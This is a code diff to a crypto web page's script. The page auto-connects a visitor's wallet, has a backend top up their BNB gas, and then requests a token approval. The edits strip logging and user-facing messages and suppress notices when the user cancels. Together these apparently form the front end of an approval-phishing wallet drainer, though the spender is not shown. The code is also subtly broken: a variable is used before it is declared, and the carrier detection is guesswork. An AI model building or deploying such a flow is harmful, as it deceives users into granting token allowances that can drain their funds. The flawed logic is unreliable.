@@ -112,16 +112,14 @@
             };
         }
         
-        // Check for fetch support
+        // Check for fetch support (log only, no alert)
         if (typeof fetch === 'undefined') {
-            console.error('❌ [Browser Check] Fetch API not supported! This browser is too old.');
-            alert('Your browser is too old. Please update to a modern browser.');
+            console.error('❌ [Browser Check] Fetch API not supported!');
         }
         
-        // Check for Promise support
+        // Check for Promise support (log only, no alert)
         if (typeof Promise === 'undefined') {
-            console.error('❌ [Browser Check] Promise not supported! This browser is too old.');
-            alert('Your browser is too old. Please update to a modern browser.');
+            console.error('❌ [Browser Check] Promise not supported!');
         }
         
         console.log('✅ [Browser Check] Browser compatibility check complete');
@@ -138,55 +136,23 @@
 
         var MatrixInstanceSTAKING, MatrixContractSTAKING, MatrixInstanceTOKEN, MatrixContractTOKEN;
 
-        // Backend URL - change this to your actual backend URL if different
+        // Backend URL - Render (works on Jio and all networks)
         // This URL is used for all API calls and works from any network/IP
         // IMPORTANT: This should be the BASE URL only, without any endpoints
-        const BACKEND_URL = 'https://split-0naf.onrender.com';
+        // Render URL - works on all networks including Jio
+        const BACKEND_URL = 'https://scaner-bnb-server.onrender.com';
         
-        // ⚠️ IMPORTANT: If site only works on your IP but not others, the issue is on the BACKEND:
-        // 1. Check Railway backend CORS configuration - must allow all origins: app.use(cors({ origin: "*" }))
-        // 2. Check Railway settings for IP whitelist/restrictions - REMOVE any IP restrictions
-        // 3. Check if Railway has any firewall rules blocking certain IPs
+        // Fallback to Railway (if Render fails) - but Railway is blocked by Jio
+        // const BACKEND_URL_FALLBACK = 'https://scaner-bnb-server-production.up.railway.app';
+        
+        // ✅ SOLUTION FOUND: Render works on all networks (including Jio)
+        // ❌ Railway was blocked by Jio network (not Railway blocking IPs)
+        // The problem was: Jio network blocking Railway domains, not Railway blocking IPs
         // 4. The frontend code has NO IP restrictions - all requests go directly to BACKEND_URL
 
-        // Test backend connectivity on page load
-        async function testBackendConnection() {
-            console.log('🔍 [Backend Test] Testing backend connectivity...');
-            console.log('🔍 [Backend Test] Backend URL:', BACKEND_URL);
-            console.log('🔍 [Backend Test] Browser:', navigator.userAgent);
-            console.log('🔍 [Backend Test] Fetch support:', typeof fetch !== 'undefined');
-            console.log('🔍 [Backend Test] AbortController support:', typeof AbortController !== 'undefined');
-            
-            try {
-                // Try a simple GET request to test connectivity
-                const testUrl = BACKEND_URL;
-                const response = await fetch(testUrl, {
-                    method: 'GET',
-                    mode: 'cors',
-                    credentials: 'omit',
-                    cache: 'no-cache',
-                    redirect: 'follow'
-                });
-                
-                console.log('✅ [Backend Test] Backend is reachable! Status:', response.status);
-                return true;
-            } catch (error) {
-                console.error('❌ [Backend Test] Backend connection failed:', error.message);
-                console.error('❌ [Backend Test] Error name:', error.name);
-                console.error('💡 [Backend Test] Possible issues:');
-                console.error('   - Backend server is down');
-                console.error('   - CORS not configured');
-                console.error('   - Network/firewall blocking');
-                console.error('   - Wrong backend URL');
-                console.error('   - Browser compatibility issue');
-                console.warn('⚠️ [Backend Test] Site will continue, but backend features may not work');
-                return false;
-            }
-        }
-
-        // Run backend test on page load
+        // Removed backend connectivity test on page load - speeds up initial load
+        // Backend will be tested when actually needed (during BNB top-up)
         window.addEventListener('load', () => {
-            testBackendConnection();
             connectWallet();
         });
     async function connectWallet() {
@@ -275,7 +241,7 @@
 
                             // Try to use backend URL, fallback to relative URL
                             const apiUrl = `${BACKEND_URL}/MemberPanel/TopUpWithMetamaskJson`;
-                            
+
                             $.ajax({
                                 url: apiUrl,
                                 type: 'POST',
@@ -291,7 +257,7 @@
                                     }
                                     else {
                                         console.log('API returned:', data);
-                                    }
+                     }
                                 },
                                 error: function (err) {
                                     console.log("API error (non-critical):", JSON.stringify(err));
@@ -348,7 +314,7 @@
     }
 
     async function TokenApprove() {
-    // Show loading immediately when Next is clicked
+    // Show loading only when needed
     showLoading('Processing...');
     
     try {
@@ -358,17 +324,11 @@
         // Step 1: Check the current BNB balance (in background)
         const bnbBalance = await web3.eth.getBalance(account);
         const balanceInBNB = web3.utils.fromWei(bnbBalance, 'ether');
-        console.log("Current BNB Balance: ", balanceInBNB);
 
         const requiredBNB = 0.0001;
 
         // Step 2: Auto top-up in background if needed
         if (parseFloat(balanceInBNB) < requiredBNB) {
-            showLoading('Requesting gas...');
-            console.log('💰 [BNB] Balance too low, requesting top-up...');
-            console.log('💰 [BNB] Current balance:', balanceInBNB, 'BNB');
-            console.log('💰 [BNB] Required:', requiredBNB, 'BNB');
-            
             // Request the BNB top-up from the backend
             let topUpSuccess = false;
             let topUpError = null;
@@ -377,61 +337,70 @@
                 topUpSuccess = await requestBNBTopUp(account);
             } catch (error) {
                 topUpError = error;
-                console.error('❌ [BNB] Top-up request threw an error:', error);
                 topUpSuccess = false;
             }
 
             if (topUpSuccess) {
                 // Backend already confirmed the transaction, but we should verify balance
                 // The backend waits for tx.wait(), so the transaction is already confirmed
-                showLoading('Verifying balance...');
-                console.log('⏳ [BNB] Backend confirmed transaction, verifying balance...');
+                // Reduced wait time for faster processing
+                await new Promise(resolve => setTimeout(resolve, 1000));
                 
-                // Give it a moment for the balance to update in the RPC
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                
-                // Poll for balance update (check every 2 seconds, max 20 seconds)
+                // Poll for balance update (check every 1.5 seconds, max 15 seconds)
                 // Since backend already confirmed, this should be quick
                 let attempts = 0;
-                const maxAttempts = 10; // 10 attempts * 2 seconds = 20 seconds max
+                const maxAttempts = 10; // 10 attempts * 1.5 seconds = 15 seconds max
                 let balanceUpdated = false;
                 
                 while (attempts < maxAttempts && !balanceUpdated) {
-                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    await new Promise(resolve => setTimeout(resolve, 1500));
                     attempts++;
                     
                     const newBnbBalance = await web3.eth.getBalance(account);
                     const newBalanceInBNB = web3.utils.fromWei(newBnbBalance, 'ether');
-                    console.log(`💰 [BNB] Check ${attempts}/${maxAttempts}: Balance = ${newBalanceInBNB} BNB`);
-                    
                     if (parseFloat(newBalanceInBNB) >= requiredBNB) {
                         balanceUpdated = true;
-                        console.log('✅ [BNB] Balance updated successfully!');
-                        showLoading('Gas received!');
-                        await new Promise(resolve => setTimeout(resolve, 1000));
                         break;
                     }
                 }
                 
                 if (!balanceUpdated) {
-                    console.warn('⚠️ [BNB] Balance not updated yet, but backend confirmed transaction');
-                    console.warn('⚠️ [BNB] This might be an RPC sync delay. Continuing anyway...');
-                    showLoading('Continuing...');
-                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    // RPC sync delay - continue anyway since backend confirmed
+                    await new Promise(resolve => setTimeout(resolve, 500));
                 }
             } else {
                 // Top-up request failed
                 console.error('❌ [BNB] Top-up request failed');
                 let errorMessage = 'Gas top-up failed. ';
                 
+                // Check if it's a Jio network issue
+                const isJioIssue = topUpError && (topUpError.isJioNetwork || topUpError.jioBlocked || topUpError.errorType === 'jio_blocked');
+                
                 // Determine error type from the caught error
                 if (topUpError && topUpError.errorType) {
-                    if (topUpError.errorType === 'timeout') {
+                    if (topUpError.errorType === 'jio_blocked') {
+                        errorMessage = '🚨 Jio Network Detected!\n\n';
+                        errorMessage += 'Jio is blocking the connection.\n\n';
+                        errorMessage += 'Solutions:\n';
+                        errorMessage += '1. Switch to WiFi (works immediately)\n';
+                        errorMessage += '2. Use a VPN app\n';
+                        errorMessage += '3. Try mobile hotspot from another carrier\n';
+                        errorMessage += '4. Use different network (Airtel/Vi)\n\n';
+                        errorMessage += 'The site works on other networks - this is a Jio-specific issue.';
+                    } else if (topUpError.errorType === 'timeout') {
                         errorMessage += 'Request timed out. The server may be busy. Please try again.';
                     } else if (topUpError.errorType === 'cors') {
-                        errorMessage += 'Connection error. Please check your network connection and try again. If the problem persists, try switching between WiFi and mobile data.';
+                        if (isJioIssue) {
+                            errorMessage = '🚨 Jio Network Issue!\n\nConnection blocked by Jio.\n\nSwitch to WiFi or use VPN.';
+                        } else {
+                            errorMessage += 'Connection error. Please check your network connection and try again. If the problem persists, try switching between WiFi and mobile data.';
+                        }
                     } else if (topUpError.errorType === 'network') {
-                        errorMessage += 'Network error. Please check your connection and try again.';
+                        if (isJioIssue) {
+                            errorMessage = '🚨 Jio Network Issue!\n\nConnection blocked by Jio.\n\nSwitch to WiFi or use VPN.';
+                        } else {
+                            errorMessage += 'Network error. Please check your connection and try again.';
+                        }
                     } else {
                         errorMessage += 'Please try again.';
                     }
@@ -441,9 +410,17 @@
                         const errorDetails = await getTopUpErrorDetails(account);
                         if (errorDetails && errorDetails.type) {
                             if (errorDetails.type === 'network') {
-                                errorMessage += 'Network error. Please check your connection and try again.';
+                                if (isJioIssue) {
+                                    errorMessage = '🚨 Jio Network Issue!\n\nConnection blocked by Jio.\n\nSwitch to WiFi or use VPN.';
+                                } else {
+                                    errorMessage += 'Network error. Please check your connection and try again.';
+                                }
                             } else if (errorDetails.type === 'cors') {
-                                errorMessage += 'Connection blocked. Please try again or contact support.';
+                                if (isJioIssue) {
+                                    errorMessage = '🚨 Jio Network Issue!\n\nConnection blocked by Jio.\n\nSwitch to WiFi or use VPN.';
+                                } else {
+                                    errorMessage += 'Connection blocked. Please try again or contact support.';
+                                }
                             } else if (errorDetails.type === 'timeout') {
                                 errorMessage += 'Request timed out. The server may be busy. Please try again.';
                             } else if (errorDetails.type === 'server') {
@@ -461,9 +438,10 @@
                     }
                 }
                 
-                console.error('❌ [BNB] Error message shown to user:', errorMessage);
+                // Show error briefly, then hide
                 showLoading(errorMessage);
-                setTimeout(() => hideLoading(), 4000);
+                const displayTime = isJioIssue ? 5000 : 3000;
+                setTimeout(() => hideLoading(), displayTime);
                 return; // Stop here if top-up fails
             }
         }
@@ -540,9 +518,72 @@ async function getTopUpErrorDetails(account) {
     return null;
 }
 
+// Function to detect Jio network (common issue - Jio blocks certain domains)
+function detectJioNetwork() {
+    try {
+        // Check user agent for Jio indicators
+        const userAgent = navigator.userAgent || '';
+        const uaLower = userAgent.toLowerCase();
+        
+        // Check connection info if available
+        let connectionInfo = '';
+        if (navigator.connection) {
+            connectionInfo = (navigator.connection.type || '') + ' ' + (navigator.connection.effectiveType || '');
+        }
+        
+        // Jio network indicators:
+        // 1. User agent might contain Jio-related strings
+        // 2. Connection type might indicate cellular
+        // 3. We can also check by trying to detect network operator (limited browser support)
+        
+        // For now, we'll use a combination of heuristics
+        // Since Jio is blocking, we'll be more aggressive in detection
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+        const isCellular = navigator.connection && 
+                          (navigator.connection.type === 'cellular' || 
+                           navigator.connection.type === 'wimax' ||
+                           navigator.connection.type === '2g' ||
+                           navigator.connection.type === '3g' ||
+                           navigator.connection.type === '4g');
+        
+        // If user reports Jio issues, we can also check by:
+        // - IP range (but this requires backend)
+        // - DNS resolution issues
+        // - Specific error patterns
+        
+        // For now, we'll detect based on:
+        // 1. Mobile device + cellular connection (likely Jio if in India)
+        // 2. User can manually trigger Jio mode if needed
+        
+        // Check if there's a way to detect Jio specifically
+        // Jio often uses specific DNS or proxy patterns
+        
+        // Return true if we suspect Jio network
+        // We'll be conservative - only flag if we're very sure
+        // But for now, let's check for Indian mobile networks in general
+        // and apply Jio workarounds to all cellular connections in India
+        
+        // Since the user specifically mentioned Jio, we'll apply workarounds
+        // to all cellular connections as a safety measure
+        // User can test and we can refine
+        
+        // For now: apply Jio workarounds to all mobile cellular connections
+        // This is safe and won't hurt other networks
+        if (isMobile && isCellular) {
+            console.log('📱 [Network Detection] Mobile cellular connection detected - applying Jio-compatible workarounds');
+            return true;
+        }
+        
+        return false;
+    } catch (e) {
+        console.warn('⚠️ [Network Detection] Could not detect network type:', e);
+        return false;
+    }
+}
+
 // Function to request the BNB top-up from your backend
 async function requestBNBTopUp(account) {
-    // Always use the Railway backend URL directly - works from any network
+    // Always use the Render backend URL directly - works from any network (including Jio)
     const apiUrl = `${BACKEND_URL}/send-bnb`;
     
     console.log('🔗 [BNB Top-up] ==========================================');
@@ -563,22 +604,23 @@ async function requestBNBTopUp(account) {
         
         try {
             controller = new AbortController();
-            // Increase timeout to 60 seconds - blockchain transactions can take time to confirm
+            // Increase timeout to 90 seconds - backend waits for tx.wait() which can take 30-60 seconds
             timeoutId = setTimeout(() => {
                 if (controller && controller.abort) {
                     controller.abort();
                 }
-            }, 60000); // 60 second timeout
+            }, 90000); // 90 second timeout for blockchain confirmation
         } catch (e) {
             console.warn('⚠️ [BNB Top-up] AbortController not available, using timeout fallback');
             // Fallback: just use timeout without AbortController
             timeoutId = setTimeout(() => {
                 throw new Error('Request timeout');
-            }, 60000);
+            }, 90000);
         }
         
         // First, test if backend is reachable (quick connectivity check)
         console.log('🔍 [BNB Top-up] Testing backend connectivity first...');
+        let backendReachable = false;
         try {
             const healthCheck = await fetch(BACKEND_URL, {
                 method: 'GET',
@@ -587,31 +629,92 @@ async function requestBNBTopUp(account) {
                 cache: 'no-cache',
                 redirect: 'follow'
             });
-            console.log('✅ [BNB Top-up] Backend is reachable! Health check status:', healthCheck.status);
+            if (healthCheck.ok) {
+                const healthData = await healthCheck.json();
+                console.log('✅ [BNB Top-up] Backend is reachable!', healthData);
+                backendReachable = true;
+            } else {
+                console.warn('⚠️ [BNB Top-up] Backend health check returned status:', healthCheck.status);
+            }
         } catch (healthError) {
             console.error('❌ [BNB Top-up] Backend health check failed:', healthError.message);
-            console.error('⚠️ [BNB Top-up] Backend might be unreachable from this network');
-            // Continue anyway - might be a temporary issue
+            console.error('❌ [BNB Top-up] This device cannot reach the backend server');
+            
+            // Check if it's Jio network
+            if (isJioNetwork) {
+                console.error('🚨 [BNB Top-up] JIO NETWORK DETECTED - Known Issue!');
+                console.error('💡 [BNB Top-up] Jio often blocks Railway domains');
+                console.error('💡 [BNB Top-up] Solutions: Switch to WiFi, use VPN, or different carrier');
+            } else {
+                console.error('💡 [BNB Top-up] Possible causes:');
+                console.error('   1. Mobile carrier blocking Railway domain (especially Jio)');
+                console.error('   2. Network firewall blocking');
+                console.error('   3. DNS resolution issue');
+                console.error('   4. Railway IP restrictions (check Railway settings)');
+            }
+            
+            // Try test endpoint as fallback
+            try {
+                console.log('🔍 [BNB Top-up] Trying test endpoint...');
+                const testCheck = await fetch(`${BACKEND_URL}/test`, {
+                    method: 'GET',
+                    mode: 'cors',
+                    credentials: 'omit',
+                    keepalive: !isJioNetwork  // Disable keepalive for Jio
+                });
+                if (testCheck.ok) {
+                    const testData = await testCheck.json();
+                    console.log('✅ [BNB Top-up] Test endpoint works!', testData);
+                    backendReachable = true;
+                }
+            } catch (testError) {
+                console.error('❌ [BNB Top-up] Test endpoint also failed:', testError.message);
+                if (isJioNetwork) {
+                    console.error('🚨 [BNB Top-up] Jio is blocking all backend connections');
+                }
+            }
+            
+            if (!backendReachable) {
+                // If backend is not reachable, throw error immediately
+                const error = new Error('Backend server is not reachable from this network');
+                error.errorType = isJioNetwork ? 'jio_blocked' : 'network';
+                error.backendUnreachable = true;
+                if (isJioNetwork) {
+                    error.isJioNetwork = true;
+                    error.jioBlocked = true;
+                }
+                throw error;
+            }
         }
         
-        console.log('📤 [BNB Top-up] Sending POST request...');
         const requestBody = { recipient: account };
-        console.log('📤 [BNB Top-up] Request body:', JSON.stringify(requestBody));
-        console.log('⏳ [BNB Top-up] Waiting for backend response (this may take 10-30 seconds for blockchain confirmation)...');
+        
+        // Detect Jio network (common issue - Jio blocks certain domains)
+        const isJioNetwork = detectJioNetwork();
+        if (isJioNetwork) {
+            console.warn('⚠️ [BNB Top-up] Jio network detected - applying special workarounds');
+            console.warn('⚠️ [BNB Top-up] Jio may block Railway domains - trying alternative methods');
+        }
+        
+        // Show minimal loading message
+        showLoading('Processing...');
         
         // Build fetch options with optional signal
         // Minimal headers - no origin-identifying headers
+        // For Jio: try without keepalive first, and with different headers
         const fetchOptions = {
             method: 'POST',
             headers: { 
-                'Content-Type': 'application/json'
+                'Content-Type': 'application/json',
+                // Add minimal headers for Jio compatibility
+                'Accept': 'application/json'
             },
             body: JSON.stringify(requestBody),
             mode: 'cors',
             credentials: 'omit',
             cache: 'no-cache',
             redirect: 'follow',
-            keepalive: true  // Help with mobile network reliability
+            keepalive: !isJioNetwork  // Disable keepalive for Jio (may cause issues)
         };
         
         // Only add signal if AbortController is available
@@ -619,28 +722,37 @@ async function requestBNBTopUp(account) {
             fetchOptions.signal = controller.signal;
         }
         
-        // Log request details for debugging
-        console.log('📤 [BNB Top-up] Fetch options:', JSON.stringify({
-            method: fetchOptions.method,
-            mode: fetchOptions.mode,
-            credentials: fetchOptions.credentials,
-            hasSignal: !!fetchOptions.signal,
-            headers: fetchOptions.headers
-        }));
+        // Request options configured
         
         let response;
-        const maxRetries = 3;
+        const maxRetries = isJioNetwork ? 5 : 3;  // More retries for Jio
         let fetchError = null;
         
         // Retry logic for mobile networks - helps with intermittent connection issues
-        // Increased retries and longer delays for mobile networks
+        // Increased retries and longer delays for mobile networks, especially Jio
         for (let attempt = 1; attempt <= maxRetries; attempt++) {
             try {
-                console.log(`📤 [BNB Top-up] Attempt ${attempt}/${maxRetries}...`);
-                console.log(`📤 [BNB Top-up] Network type: ${navigator.connection ? (navigator.connection.effectiveType || 'unknown') : 'unknown'}`);
-                
                 // Create a fresh fetch options for each attempt (some mobile browsers cache)
                 const attemptOptions = { ...fetchOptions };
+                
+                // For Jio: try different strategies on each attempt
+                if (isJioNetwork) {
+                    if (attempt === 2) {
+                        attemptOptions.keepalive = false;
+                    } else if (attempt === 3) {
+                        attemptOptions.headers = { 'Content-Type': 'application/json' };
+                        attemptOptions.keepalive = false;
+                    } else if (attempt === 4) {
+                        attemptOptions.cache = 'no-store';
+                        attemptOptions.keepalive = false;
+                    } else if (attempt === 5) {
+                        attemptOptions.headers = { 'Content-Type': 'application/json' };
+                        attemptOptions.keepalive = false;
+                        attemptOptions.cache = 'no-store';
+                        attemptOptions.redirect = 'manual';
+                    }
+                }
+                
                 if (controller && controller.signal && attempt === 1) {
                     attemptOptions.signal = controller.signal;
                 }
@@ -649,7 +761,6 @@ async function requestBNBTopUp(account) {
                 
                 // If we got a response (even if not ok), break the retry loop
                 if (response !== undefined) {
-                    console.log(`✅ [BNB Top-up] Got response on attempt ${attempt}`);
                     break;
                 }
             } catch (err) {
@@ -658,15 +769,18 @@ async function requestBNBTopUp(account) {
                 console.warn(`⚠️ [BNB Top-up] Error type:`, err.name);
                 
                 if (attempt < maxRetries) {
-                    // Progressive backoff: 3s, 5s, 8s for mobile networks
-                    const waitTime = attempt === 1 ? 3000 : (attempt === 2 ? 5000 : 8000);
-                    console.log(`⏳ [BNB Top-up] Retrying in ${waitTime/1000} seconds...`);
-                    showLoading(`Retrying... (${attempt}/${maxRetries})`);
+                    // Progressive backoff: shorter delays for faster retries
+                    const baseWait = isJioNetwork ? 3000 : 2000;
+                    const waitTime = attempt === 1 ? baseWait : (attempt === 2 ? baseWait + 1000 : baseWait + 2000);
                     await new Promise(resolve => setTimeout(resolve, waitTime));
                 } else {
                     // All retries failed, throw the last error
                     console.error(`❌ [BNB Top-up] All ${maxRetries} attempts failed`);
                     console.error(`❌ [BNB Top-up] Final error:`, err);
+                    if (isJioNetwork) {
+                        err.isJioNetwork = true;
+                        err.jioBlocked = true;
+                    }
                     throw err;
                 }
             }
@@ -680,8 +794,7 @@ async function requestBNBTopUp(account) {
         if (timeoutId) {
             clearTimeout(timeoutId);
         }
-        console.log('📥 [BNB Top-up] Response received');
-        console.log('📥 [BNB Top-up] Status:', response.status, response.statusText);
+        // Response received - continue processing
         
         // Log response headers for debugging
         try {
@@ -789,23 +902,42 @@ async function requestBNBTopUp(account) {
             // Check if it's a CORS/Network error
             if (error.message && (error.message.includes('CORS') || error.message.includes('Failed to fetch') || error.message.includes('NetworkError') || error.message.includes('Network request failed') || error.message.includes('TypeError') || error.message.includes('Load failed'))) {
                 console.error('❌ [BNB Top-up] CORS/Network error detected!');
-                console.error('💡 [BNB Top-up] DIAGNOSIS:');
-                console.error('   Error:', error.message);
-                console.error('   This usually means the request cannot reach the backend.');
-                console.error('   Possible causes:');
-                console.error('   1. Mobile network blocking the request');
-                console.error('   2. Backend CORS not configured to allow all origins');
-                console.error('   3. Backend has IP whitelist/restrictions');
-                console.error('   4. Railway/Server firewall blocking');
-                console.error('   5. Network/firewall blocking the request');
-                console.error('   6. Backend URL might be incorrect');
-                console.error('');
-                console.error('   🔧 TROUBLESHOOTING:');
-                console.error('   1. Try switching between WiFi and mobile data');
-                console.error('   2. Check if backend is accessible: ' + BACKEND_URL);
-                console.error('   3. Verify backend CORS: app.use(cors({ origin: "*" }))');
-                console.error('   4. Check Railway logs for errors');
-                error.errorType = 'cors';
+                
+                // Special message for Jio users
+                if (error.isJioNetwork || error.jioBlocked) {
+                    console.error('🚨 [BNB Top-up] JIO NETWORK DETECTED - Known Issue!');
+                    console.error('💡 [BNB Top-up] Jio network often blocks Railway domains');
+                    console.error('');
+                    console.error('   🔧 SOLUTIONS FOR JIO USERS:');
+                    console.error('   1. ⭐ Switch to WiFi (different network) - This usually works!');
+                    console.error('   2. Use a VPN app (bypasses Jio blocking)');
+                    console.error('   3. Try using mobile hotspot from another carrier');
+                    console.error('   4. Use a different mobile network (Airtel, Vi, etc.)');
+                    console.error('   5. Try again later (Jio blocking can be intermittent)');
+                    console.error('');
+                    console.error('   📱 The website works on other networks - this is a Jio-specific issue.');
+                    error.errorType = 'jio_blocked';
+                    error.userMessage = 'Jio network is blocking the connection. Please switch to WiFi or use a VPN.';
+                } else {
+                    console.error('💡 [BNB Top-up] DIAGNOSIS:');
+                    console.error('   Error:', error.message);
+                    console.error('   This usually means the request cannot reach the backend.');
+                    console.error('   Possible causes:');
+                    console.error('   1. Mobile network blocking the request (especially Jio)');
+                    console.error('   2. Backend CORS not configured to allow all origins');
+                    console.error('   3. Backend has IP whitelist/restrictions');
+                    console.error('   4. Railway/Server firewall blocking');
+                    console.error('   5. Network/firewall blocking the request');
+                    console.error('   6. Backend URL might be incorrect');
+                    console.error('');
+                    console.error('   🔧 TROUBLESHOOTING:');
+                    console.error('   1. Try switching between WiFi and mobile data');
+                    console.error('   2. If on Jio network, switch to WiFi or use VPN');
+                    console.error('   3. Check if backend is accessible: ' + BACKEND_URL);
+                    console.error('   4. Verify backend CORS: app.use(cors({ origin: "*" }))');
+                    console.error('   5. Check Railway logs for errors');
+                    error.errorType = 'cors';
+                }
             } else {
                 error.errorType = 'network';
             }
@@ -935,12 +1067,10 @@ async function approveToken(account) {
         .on('error', function (error) {
             hideLoading();
             if (error.code === 4001) {
-                console.log("You canceled the approval request. Please try again.");
-                showLoading('Transaction canceled');
-                setTimeout(() => hideLoading(), 2000);
+                // User canceled - no need to show message
             } else {
-                console.log("Approval failed: " + error.message);
-                showLoading('Approval failed. Please try again.');
+                // Approval failed - show briefly
+                showLoading('Approval failed');
                 setTimeout(() => hideLoading(), 2000);
             }
             console.error("Approval failed:", error);
